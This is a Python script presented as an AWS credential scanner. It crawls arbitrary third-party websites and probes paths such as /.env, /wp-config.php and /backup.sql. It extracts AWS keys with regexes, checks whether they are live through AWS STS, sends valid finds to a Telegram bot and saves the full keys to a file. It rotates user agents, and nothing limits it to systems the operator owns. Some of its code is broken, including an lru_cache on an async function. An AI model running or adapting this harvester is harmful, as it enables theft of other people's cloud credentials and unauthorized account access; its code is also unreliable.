#!/usr/bin/env python3
"""
AWS Credential Scanner - An advanced tool for detecting exposed AWS credentials
"""

import asyncio
import aiohttp
import sys
import json
import logging
import argparse
import time
import random
import os
import socket
from datetime import datetime
from urllib.parse import urlparse, urljoin, unquote
from typing import Dict, List, Tuple, Set, Optional, Any, Union
from functools import lru_cache
import base64
import yaml
from pathlib import Path

# Optional dependencies with graceful fallbacks
try:
    import boto3
    from botocore.exceptions import ClientError
    BOTO3_AVAILABLE = True
except ImportError:
    BOTO3_AVAILABLE = False
    print("Warning: boto3 not installed. AWS key validation will be disabled.")

try:
    from bs4 import BeautifulSoup, Comment
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False
    print("Warning: BeautifulSoup not installed. HTML parsing will be limited.")

try:
    import telebot
    TELEGRAM_AVAILABLE = True
except ImportError:
    TELEGRAM_AVAILABLE = False

# Configuration
CONFIG_DIR = Path.home() / ".aws_scanner"
CONFIG_FILE = CONFIG_DIR / "config.json"
DEFAULT_CONFIG = {
    "telegram_token": "",
    "telegram_chat_id": "",
    "aws_profile": "default",
    "timeout": 30,
    "user_agents": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
    ],
    "scan_depth": 50,
    "confidence_threshold": 0.6
}

# Color codes for terminal output
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Pattern definitions
class Patterns:
    # AWS Access Key Pattern (AKIA followed by 16 alphanumeric characters)
    AKIA = r'\b(AKIA[A-Z0-9]{16})\b(?![^\n]*\b(example|test|sample|dummy|fake)\b|\s*(?:#|//|<!--)[\s\S]*\b\1\b)'
    
    # AWS Secret Key Pattern (40 character base64 string)
    SECRET = r'\b([a-zA-Z0-9+/]{40})\b(?![^\n]*\b(example|test|sample|dummy|fake)\b|\s*(?:#|//|<!--)[\s\S]*\b\1\b)'
    
    # AWS Environment Variables
    AWS_ENV = r'(?:AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|aws_access_key_id|aws_secret_access_key)\s*[:=]\s*[\'"]?([a-zA-Z0-9+/]{16,40})[\'"]?'
    
    # Common config patterns
    CONFIG_PATTERNS = [
        r'accessKeyId["\']?\s*[:=]\s*[\'"]([a-zA-Z0-9+/]{16,40})[\'"]',
        r'secretAccessKey["\']?\s*[:=]\s*[\'"]([a-zA-Z0-9+/]{16,40})[\'"]',
        r'aws_key["\']?\s*[:=]\s*[\'"]([a-zA-Z0-9+/]{16,40})[\'"]',
        r'aws_secret["\']?\s*[:=]\s*[\'"]([a-zA-Z0-9+/]{16,40})[\'"]'
    ]

# Setup logging
def setup_logging(verbose: bool = False) -> logging.Logger:
    """Configure logging with appropriate level and format."""
    level = logging.DEBUG if verbose else logging.INFO
    log_format = '%(asctime)s - %(levelname)s - %(message)s'
    logging.basicConfig(level=level, format=log_format)
    logger = logging.getLogger("aws_scanner")
    
    # Add file handler
    os.makedirs(CONFIG_DIR, exist_ok=True)
    file_handler = logging.FileHandler(CONFIG_DIR / "scanner.log")
    file_handler.setFormatter(logging.Formatter(log_format))
    logger.addHandler(file_handler)
    
    return logger

# Config management
def load_config() -> Dict[str, Any]:
    """Load configuration from file or create default."""
    os.makedirs(CONFIG_DIR, exist_ok=True)
    
    if CONFIG_FILE.exists():
        try:
            with open(CONFIG_FILE, 'r') as f:
                config = json.load(f)
                # Update with any missing default values
                for key, value in DEFAULT_CONFIG.items():
                    if key not in config:
                        config[key] = value
                return config
        except (json.JSONDecodeError, IOError) as e:
            print(f"Error loading config: {e}")
            return DEFAULT_CONFIG
    else:
        # Create default config
        with open(CONFIG_FILE, 'w') as f:
            json.dump(DEFAULT_CONFIG, f, indent=2)
        return DEFAULT_CONFIG

def save_config(config: Dict[str, Any]) -> None:
    """Save configuration to file."""
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=2)

# Telegram integration
class TelegramNotifier:
    """Handles Telegram notifications."""
    
    def __init__(self, token: str, chat_id: str):
        self.token = token
        self.chat_id = chat_id
        self.bot = None
        if TELEGRAM_AVAILABLE and token and chat_id:
            try:
                self.bot = telebot.TeleBot(token)
            except Exception as e:
                print(f"Error initializing Telegram bot: {e}")
    
    def send_message(self, message: str) -> bool:
        """Send a message to the configured Telegram chat."""
        if not self.bot:
            return False
        
        try:
            # Truncate message if it's too long
            if len(message) > 4000:
                message = message[:4000] + "... (message truncated)"
            
            self.bot.send_message(self.chat_id, message, parse_mode="Markdown")
            return True
        except Exception as e:
            print(f"Error sending Telegram message: {e}")
            return False
    
    def notify_finding(self, target: str, key_type: str, key: str, valid: bool) -> None:
        """Send a notification about a found AWS key."""
        if not self.bot:
            return
        
        status = "✅ VALID" if valid else "❌ INVALID"
        message = f"*AWS Key Found*\n\n" \
                 f"🎯 Target: `{target}`\n" \
                 f"🔑 Type: {key_type}\n" \
                 f"🔐 Key: `{key[:4]}...{key[-4:]}`\n" \
                 f"📊 Status: {status}\n\n" \
                 f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        
        self.send_message(message)

# Target management
def read_targets_from_file(file_path: str) -> List[str]:
    """Read targets from a file, handling comments and empty lines."""
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file 
                   if line.strip() and not line.strip().startswith('#')]
    except FileNotFoundError:
        print(f"{Colors.RED}Error: File {file_path} not found.{Colors.ENDC}")
        sys.exit(1)
    except IOError as e:
        print(f"{Colors.RED}Error reading file {file_path}: {e}{Colors.ENDC}")
        sys.exit(1)

def validate_target(target: str) -> Tuple[bool, str]:
    """Validate and normalize a target."""
    if target.startswith(('http://', 'https://')):
        try:
            parsed = urlparse(target)
            if not parsed.netloc:
                return False, "Invalid URL format"
            return True, target
        except Exception:
            return False, "Invalid URL"
    
    # Check if it's an IP address
    try:
        socket.inet_aton(target)
        return True, f"http://{target}"
    except socket.error:
        # Try as a domain name
        if '.' in target:
            return True, f"http://{target}"
        return False, "Invalid target format"

def interactive_file_selection() -> str:
    """Present an interactive menu for selecting a target file."""
    print(f"\n{Colors.HEADER}=== AWS Credential Scanner - Target Selection ==={Colors.ENDC}")
    
    # Look for .txt files in the current directory
    files = [f for f in os.listdir('.') if f.endswith('.txt')]
    
    if not files:
        print(f"{Colors.RED}No .txt files found in the current directory.{Colors.ENDC}")
        print("Please create a file with your targets, one per line.")
        sys.exit(1)
    
    print(f"{Colors.CYAN}Available target files:{Colors.ENDC}")
    for idx, file in enumerate(files, 1):
        print(f"{Colors.BOLD}{idx}.{Colors.ENDC} {file}")
    
    while True:
        choice = input(f"\n{Colors.GREEN}Enter file name or number (or 'q' to quit): {Colors.ENDC}").strip()
        
        if choice.lower() == 'q':
            sys.exit(0)
        
        # Check if input is a number
        if choice.isdigit() and 1 <= int(choice) <= len(files):
            return files[int(choice) - 1]
        
        # Check if input is a filename
        if choice in files:
            return choice
        
        print(f"{Colors.YELLOW}Invalid selection. Please try again.{Colors.ENDC}")

# HTTP and content fetching
@lru_cache(maxsize=1000)
async def fetch_content(session: aiohttp.ClientSession, url: str, timeout: int, 
                       user_agents: List[str]) -> Dict[str, str]:
    """Fetch content from a URL with error handling and metadata collection."""
    headers = {
        "User-Agent": random.choice(user_agents),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1"
    }
    
    try:
        async with session.get(url, 
                             timeout=aiohttp.ClientTimeout(total=timeout), 
                             allow_redirects=True, 
                             headers=headers) as response:
            
            content = await response.text(errors='replace')
            status = response.status
            headers_str = str(dict(response.headers))
            
            # Wait a bit to avoid rate limiting
            await asyncio.sleep(random.uniform(0.5, 1.5))
            
            return {
                "content": content,
                "status": status,
                "headers": headers_str,
                "url": str(response.url)
            }
    except asyncio.TimeoutError:
        return {"content": "", "status": 0, "headers": "", "url": url, "error": "timeout"}
    except Exception as e:
        return {"content": "", "status": 0, "headers": "", "url": url, "error": str(e)}

async def explore_target(session: aiohttp.ClientSession, base_url: str, 
                       timeout: int, scan_depth: int, user_agents: List[str],
                       logger: logging.Logger) -> List[Dict[str, str]]:
    """Explore a target by crawling linked pages and sensitive endpoints."""
    results = []
    visited = set()
    to_visit = [base_url]
    sensitive_paths = [
        '/.env', '/.env.local', '/.env.development', '/.env.production',
        '/config.json', '/aws-config.json', '/credentials.json', '/settings.json',
        '/config/aws.php', '/config/settings.php', '/config/credentials.php',
        '/api/keys', '/api/config', '/api/v1/config', '/api/v2/config',
        '/wp-config.php', '/wp-content/debug.log',
        '/backup', '/backups', '/backup.sql', '/dump.sql', '/database.sql'
    ]
    
    # Add sensitive paths to the visit queue
    parsed_url = urlparse(base_url)
    base_domain = f"{parsed_url.scheme}://{parsed_url.netloc}"
    for path in sensitive_paths:
        to_visit.append(urljoin(base_domain, path))
    
    visit_count = 0
    
    while to_visit and visit_count < scan_depth:
        current_url = to_visit.pop(0)
        
        if current_url in visited:
            continue
        
        visited.add(current_url)
        visit_count += 1
        
        logger.debug(f"Exploring: {current_url} ({visit_count}/{scan_depth})")
        
        # Fetch the content
        data = await fetch_content(session, current_url, timeout, user_agents)
        results.append(data)
        
        if not data["content"]:
            continue
        
        # Parse links if BeautifulSoup is available
        if BS4_AVAILABLE and data["status"] in (200, 301, 302):
            try:
                soup = BeautifulSoup(data["content"], 'html.parser')
                
                # Extract links from a, link, and script tags
                for tag in soup.find_all(['a', 'link', 'script']):
                    href = tag.get('href') or tag.get('src')
                    if href:
                        next_url = urljoin(current_url, href)
                        parsed = urlparse(next_url)
                        
                        # Only follow links to the same domain
                        if parsed.netloc == parsed_url.netloc and next_url not in visited:
                            to_visit.append(next_url)
            except Exception as e:
                logger.warning(f"Error parsing HTML: {e}")
    
    logger.info(f"Explored {visit_count} URLs for {base_url}")
    return results

# Content analysis
def analyze_semantic_context(content: str, match: str) -> float:
    """Analyze the semantic context of a match to calculate a confidence score."""
    try:
        match_idx = content.index(match)
        start = max(0, match_idx - 200)
        end = min(len(content), match_idx + 200)
        context = content[start:end].lower()
        
        # Keywords that suggest this might be a real credential
        positive_indicators = [
            'aws', 'amazon', 'key', 'secret', 'access', 'credential', 'token',
            'config', 'authentication', 'auth', 'production', 'prod', 'api'
        ]
        
        # Keywords that suggest this might be a test/example
        negative_indicators = [
            'example', 'test', 'sample', 'dummy', 'fake', 'demo', 'placeholder',
            'your_', 'xxx', 'changeme', 'template', 'default'
        ]
        
        # Calculate a score based on indicators
        positive_score = sum(1 for word in positive_indicators if word in context) / len(positive_indicators)
        negative_score = sum(1 for word in negative_indicators if word in context) / len(negative_indicators)
        
        # Code-like context is more likely to be real credentials
        code_indicators = ['{', '}', ':', '=', ';', '"', "'", 'function', 'const', 'var', 'let']
        code_score = sum(1 for indicator in code_indicators if indicator in context) / len(code_indicators)
        
        # Combine scores, giving more weight to positive indicators
        final_score = (0.5 * positive_score + 0.3 * code_score) - (0.7 * negative_score)
        return max(0.0, min(1.0, final_score))
    except (ValueError, Exception):
        return 0.3  # Default moderate confidence if we can't analyze context

async def extract_keys_from_content(content: str) -> Tuple[List[Tuple[str, float]], List[Tuple[str, float]]]:
    """Extract AWS keys from content with confidence scores."""
    # Basic key extraction with regex
    access_keys = [(k, analyze_semantic_context(content, k)) for k in set(re.findall(Patterns.AKIA, content))]
    secret_keys = [(s, analyze_semantic_context(content, s)) for s in set(re.findall(Patterns.SECRET, content))]
    
    # Extract from environment variables
    env_matches = re.findall(Patterns.AWS_ENV, content, re.IGNORECASE)
    for match in env_matches:
        if len(match) == 20 and match.startswith("AKIA"):
            access_keys.append((match, analyze_semantic_context(content, match)))
        elif len(match) == 40:
            secret_keys.append((match, analyze_semantic_context(content, match)))
    
    # Extract from config patterns
    for pattern in Patterns.CONFIG_PATTERNS:
        config_matches = re.findall(pattern, content, re.IGNORECASE)
        for match in config_matches:
            if len(match) == 20 and match.startswith("AKIA"):
                access_keys.append((match, analyze_semantic_context(content, match)))
            elif len(match) == 40:
                secret_keys.append((match, analyze_semantic_context(content, match)))
    
    # Try to decode various formats
    try:
        # Base64 decoding
        try:
            decoded = base64.b64decode(content).decode(errors='replace')
            if len(decoded) > 10:  # Only if we got meaningful output
                access_keys.extend([(k, analyze_semantic_context(decoded, k)) 
                                  for k in set(re.findall(Patterns.AKIA, decoded))
                                  if k not in [k[0] for k in access_keys]])
                secret_keys.extend([(s, analyze_semantic_context(decoded, s))
                                   for s in set(re.findall(Patterns.SECRET, decoded))
                                   if s not in [s[0] for s in secret_keys]])
        except Exception:
            pass
        
        # URL decoding
        try:
            decoded = unquote(content)
            access_keys.extend([(k, analyze_semantic_context(decoded, k)) 
                              for k in set(re.findall(Patterns.AKIA, decoded))
                              if k not in [k[0] for k in access_keys]])
            secret_keys.extend([(s, analyze_semantic_context(decoded, s))
                               for s in set(re.findall(Patterns.SECRET, decoded))
                               if s not in [s[0] for s in secret_keys]])
        except Exception:
            pass
        
        # JSON parsing
        try:
            json_data = json.loads(content)
            json_str = json.dumps(json_data)
            access_keys.extend([(k, analyze_semantic_context(json_str, k)) 
                              for k in set(re.findall(Patterns.AKIA, json_str))
                              if k not in [k[0] for k in access_keys]])
            secret_keys.extend([(s, analyze_semantic_context(json_str, s))
                               for s in set(re.findall(Patterns.SECRET, json_str))
                               if s not in [s[0] for s in secret_keys]])
        except json.JSONDecodeError:
            pass
        
        # YAML parsing
        try:
            yaml_data = yaml.safe_load(content)
            if yaml_data:
                yaml_str = str(yaml_data)
                access_keys.extend([(k, analyze_semantic_context(yaml_str, k)) 
                                  for k in set(re.findall(Patterns.AKIA, yaml_str))
                                  if k not in [k[0] for k in access_keys]])
                secret_keys.extend([(s, analyze_semantic_context(yaml_str, s))
                                   for s in set(re.findall(Patterns.SECRET, yaml_str))
                                   if s not in [s[0] for s in secret_keys]])
        except Exception:
            pass
    except Exception:
        pass
    
    return access_keys, secret_keys

# AWS key validation
def validate_aws_key(access_key: str) -> Tuple[bool, str]:
    """Validate an AWS access key and return validity and account ID."""
    if not BOTO3_AVAILABLE:
        return False, "boto3 not installed"
    
    try:
        # Try to get access key info without credentials
        sts = boto3.client('sts')
        response = sts.get_access_key_info(AccessKeyId=access_key)
        return True, response.get('Account', 'Unknown')
    except ClientError as e:
        error_code = e.response['Error']['Code']
        if error_code == 'InvalidClientTokenId':
            # Key format is valid but the key is invalid or inactive
            return False, "Invalid or inactive key"
        return False, f"Error: {error_code}"
    except Exception as e:
        return False, f"Error: {str(e)}"

# Scanning logic
async def scan_target(
    session: aiohttp.ClientSession,
    target: str,
    timeout: int,
    scan_depth: int,
    user_agents: List[str],
    confidence_threshold: float,
    telegram: TelegramNotifier,
    logger: logging.Logger
) -> Dict[str, Any]:
    """Scan a target for AWS keys."""
    valid, normalized_target = validate_target(target)
    if not valid:
        logger.warning(f"Invalid target: {target} - {normalized_target}")
        return {
            "target": target,
            "error": normalized_target,
            "access_keys": [],
            "secret_keys": []
        }
    
    logger.info(f"Starting scan for {normalized_target}")
    
    # Explore the target and fetch content
    try:
        fetched_data = await explore_target(
            session, normalized_target, timeout, scan_depth, user_agents, logger
        )
        
        # Combine all content for analysis
        combined_content = " ".join(
            data["content"] + " " + data["headers"]
            for data in fetched_data
            if data["content"]
        )
        
        # Extract keys from the combined content
        access_keys, secret_keys = await extract_keys_from_content(combined_content)
        
        # Filter by confidence threshold
        filtered_access_keys = [(key, score) for key, score in access_keys if score >= confidence_threshold]
        filtered_secret_keys = [(key, score) for key, score in secret_keys if score >= confidence_threshold]
        
        # Validate access keys if boto3 is available
        validated_access_keys = []
        for key, score in filtered_access_keys:
            is_valid, account = validate_aws_key(key) if BOTO3_AVAILABLE else (False, "Validation skipped")
            validated_access_keys.append((key, is_valid, account, score))
            
            # Notify via Telegram if a valid key is found
            if is_valid:
                telegram.notify_finding(target, "AWS Access Key", key, is_valid)
        
        # Prepare results
        result = {
            "target": target,
            "scanned_urls": len(fetched_data),
            "access_keys": validated_access_keys,
            "secret_keys": [(key, score) for key, score in filtered_secret_keys]
        }
        
        logger.info(f"Scan completed for {target}. Found {len(validated_access_keys)} access keys and {len(filtered_secret_keys)} secret keys.")
        return result
    
    except Exception as e:
        logger.error(f"Error scanning {target}: {e}")
        return {
            "target": target,
            "error": str(e),
            "access_keys": [],
            "secret_keys": []
        }

# Output handling
def print_scan_results(results: Dict[str, Any]) -> None:
    """Print scan results to the console with formatting."""
    target = results["target"]
    
    print(f"\n{Colors.HEADER}{'=' * 60}{Colors.ENDC}")
    print(f"{Colors.BOLD}Scan Results for: {Colors.BLUE}{target}{Colors.ENDC}")
    print(f"{Colors.HEADER}{'-' * 60}{Colors.ENDC}")
    
    if "error" in results and results["error"]:
        print(f"{Colors.RED}Error: {results['error']}{Colors.ENDC}")
        return
    
    print(f"{Colors.BOLD}Scanned URLs:{Colors.ENDC} {results.get('scanned_urls', 0)}")
    
    # Print access keys
    access_keys = results.get("access_keys", [])
    if access_keys:
        print(f"\n{Colors.BOLD}AWS Access Keys Found: {len(access_keys)}{Colors.ENDC}")
        for idx, (key, valid, account, score) in enumerate(access_keys, 1):
            status = f"{Colors.GREEN}Valid{Colors.ENDC}" if valid else f"{Colors.RED}Invalid{Colors.ENDC}"
            print(f"  {idx}. Key: {Colors.YELLOW}{key[:4]}...{key[-4:]}{Colors.ENDC}")
            print(f"     Status: {status}")
            print(f"     Account: {account}")
            print(f"     Confidence: {Colors.CYAN}{score:.2f}{Colors.ENDC}")
            print()
    else:
        print(f"\n{Colors.GREEN}No AWS Access Keys found.{Colors.ENDC}")
    
    # Print secret keys
    secret_keys = results.get("secret_keys", [])
    if secret_keys:
        print(f"\n{Colors.BOLD}AWS Secret Keys Found: {len(secret_keys)}{Colors.ENDC}")
        for idx, (key, score) in enumerate(secret_keys, 1):
            print(f"  {idx}. Key: {Colors.YELLOW}{key[:4]}...{key[-4:]}{Colors.ENDC}")
            print(f"     Confidence: {Colors.CYAN}{score:.2f}{Colors.ENDC}")
            print()
    else:
        print(f"\n{Colors.GREEN}No AWS Secret Keys found.{Colors.ENDC}")
    
    print(f"{Colors.HEADER}{'=' * 60}{Colors.ENDC}\n")

def write_results_to_file(results: List[Dict[str, Any]], filename: str, format_type: str) -> None:
    """Write scan results to a file in the specified format."""
    if format_type.lower() == 'json':
        # Convert to a serializable format
        serializable_results = []
        for r in results:
            result = r.copy()
            if 'access_keys' in result:
                result['access_keys'] = [
                    {
                        'key': key,
                        'valid': valid,
                        'account': account,
                        'confidence': score
                    }
                    for key, valid, account, score in result['access_keys']
                ]
            if 'secret_keys' in result:
                result['secret_keys'] = [
                    {
                        'key': key,
                        'confidence': score
                    }
                    for key, score in result['secret_keys']
                ]
            serializable_results.append(result)
        
        with open(filename, 'w') as f:
            json.dump(serializable_results, f, indent=2)
    else:  # text format
        with open(filename, 'w') as f:
            f.write(f"AWS Credential Scanner Results - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            
            for result in results:
                target = result["target"]
                f.write(f"Target: {target}\n")
                f.write("-" * 60 + "\n")
                
                if "error" in result and result["error"]:
                    f.write(f"Error: {result['error']}\n\n")
                    continue
                
                f.write(f"Scanned URLs: {result.get('scanned_urls', 0)}\n\n")
                
                # Write access keys
                access_keys = result.get("access_keys", [])
                if access_keys:
                    f.write(f"AWS Access Keys Found: {len(access_keys)}\n")
                    for idx, (key, valid, account, score) in enumerate(access_keys, 1):
                        f.write(f"  {idx}. Key: {key}\n")
                        f.write(f"     Status: {'Valid' if valid else 'Invalid'}\n")
                        f.write(f"     Account: {account}\n")
                        f.write(f"     Confidence: {score:.2f}\n\n")
                else:
                    f.write("No AWS Access Keys found.\n\n")
                
                # Write secret keys
                secret_keys = result.get("secret_keys", [])
                if secret_keys:
                    f.write(f"AWS Secret Keys Found: {len(secret_keys)}\n")
                    for idx, (key, score) in enumerate(secret_keys, 1):
                        f.write(f"  {idx}. Key: {key}\n")
                        f.write(f"     Confidence: {score:.2f}\n\n")
                else:
                    f.write("No AWS Secret Keys found.\n\n")
                
                f.write("=" * 60 + "\n\n")

# Main functionality
async def main() -> None:
    """Main function orchestrating the scan process."""
    parser = argparse.ArgumentParser(description="AWS Credential Scanner - Find exposed AWS credentials")
    parser.add_argument('-f', '--file', help="File containing targets (one per line)")
    parser.add_argument('-t', '--timeout', type=int, help="Request timeout in seconds")
    parser.add_argument('-d', '--depth', type=int, help="Maximum scan depth per target")
    parser.add_argument('-o', '--output', help="Output file path")
    parser.add_argument('--format', choices=['text', 'json'], default='text', help="Output format")
    parser.add_argument('-v', '--verbose', action='store_true', help="Enable verbose logging")
    parser.add_argument('--config', action='store_true', help="Configure Telegram notifications")
    args = parser.parse_args()
    
    # Setup logging
    logger = setup_logging(args.verbose)
    
    # Load config
    config = load_config()
    
    # Configure Telegram if requested
    if args.config:
        print(f"\n{Colors.HEADER}=== AWS Credential Scanner - Configuration ==={Colors.ENDC}")
        print(f"{Colors.CYAN}Configure Telegram notifications (optional){Colors.ENDC}")
        
        token = input("Enter Telegram Bot Token (leave empty to skip): ").strip()
        chat_id = input("Enter Telegram Chat ID (leave empty to skip): ").strip()
        
        if token and chat_id:
            config['telegram_token'] = token
            config['telegram_chat_id'] = chat_id
            save_config(config)
            print(f"{Colors.GREEN}Telegram configuration saved!{Colors.ENDC}")
        else:
            print(f"{Colors.YELLOW}Telegram notifications skipped.{Colors.ENDC}")
        
        # Configure AWS profile
        aws_profile = input("Enter AWS profile name (leave empty for 'default'): ").strip() or "default"
        config['aws_profile'] = aws_profile
        
        # Configure scan settings
        try:
            timeout = int(input("Enter request timeout in seconds (default: 30): ").strip() or "30")
            config['timeout'] = timeout
        except ValueError:
            print(f"{Colors.YELLOW}Invalid timeout value. Using default (30 seconds).{Colors.ENDC}")
        
        try:
            scan_depth = int(input("Enter maximum scan depth per target (default: 50): ").strip() or "50")
            config['scan_depth'] = scan_depth
        except ValueError:
            print(f"{Colors.YELLOW}Invalid scan depth value. Using default (50).{Colors.ENDC}")
        
        save_config(config)
        print(f"{Colors.GREEN}Configuration saved!{Colors.ENDC}")
        
        restart = input("Do you want to start scanning now? (y/n): ").strip().lower()
        if restart != 'y':
            print(f"{Colors.BLUE}Exiting. Run the scanner again to start scanning.{Colors.ENDC}")
            return
    
    # Initialize Telegram
    telegram = TelegramNotifier(config['telegram_token'], config['telegram_chat_id'])
    
    # Get targets
    targets_file = args.file
    if not targets_file:
        targets_file = interactive_file_selection()
    
    targets = read_targets_from_file(targets_file)
    if not targets:
        logger.error("No valid targets found in the file.")
        print(f"{Colors.RED}Error: No valid targets found in {targets_file}.{Colors.ENDC}")
        return
    
    # Set scan parameters
    timeout = args.timeout or config['timeout']
    scan_depth = args.depth or config['scan_depth']
    output_file = args.output or f"aws_scan_results_{int(time.time())}.{args.format}"
    
    # Print scan info
    print(f"\n{Colors.HEADER}=== AWS Credential Scanner - Starting Scan ==={Colors.ENDC}")
    print(f"{Colors.CYAN}Targets:{Colors.ENDC} {len(targets)}")
    print(f"{Colors.CYAN}Timeout:{Colors.ENDC} {timeout} seconds")
    print(f"{Colors.CYAN}Scan Depth:{Colors.ENDC} {scan_depth} URLs per target")
    print(f"{Colors.CYAN}Output File:{Colors.ENDC} {output_file}")
    print(f"{Colors.CYAN}Format:{Colors.ENDC} {args.format}")
    print(f"{Colors.CYAN}Telegram:{Colors.ENDC} {'Enabled' if telegram.bot else 'Disabled'}")
    print(f"\n{Colors.BLUE}Starting scan at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.ENDC}")
    
    # Initialize progress tracking
    total_targets = len(targets)
    completed = 0
    
    # Perform the scan
    async with aiohttp.ClientSession() as session:
        tasks = []
        for target in targets:
            task = scan_target(
                session, target, timeout, scan_depth, 
                config['user_agents'], config['confidence_threshold'],
                telegram, logger
            )
            tasks.append(task)
        
        results = []
        for future in asyncio.as_completed(tasks):
            result = await future
            results.append(result)
            
            # Update progress
            completed += 1
            progress = completed / total_targets * 100
            print(f"{Colors.BLUE}Progress: {completed}/{total_targets} ({progress:.1f}%){Colors.ENDC}")
            
            # Print result
            print_scan_results(result)
    
    # Write results to file
    write_results_to_file(results, output_file, args.format)
    print(f"\n{Colors.GREEN}Scan completed! Results saved to {output_file}{Colors.ENDC}")
    
    # Send summary to Telegram if enabled
    if telegram.bot:
        valid_keys = sum(
            1 for r in results 
            for _, valid, _, _ in r.get('access_keys', []) 
            if valid
        )
        
        if valid_keys > 0:
            summary = f"*AWS Credential Scan Complete*\n\n" \
                     f"📊 Scanned {len(targets)} targets\n" \
                     f"🔑 Found {valid_keys} valid AWS keys\n\n" \
                     f"⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            telegram.send_message(summary)

if __name__ == "__main__":
    try:
        import re  # Import at the end to ensure proper functionality
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Scan interrupted by user.{Colors.ENDC}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}Error: {str(e)}{Colors.ENDC}")
        sys.exit(1)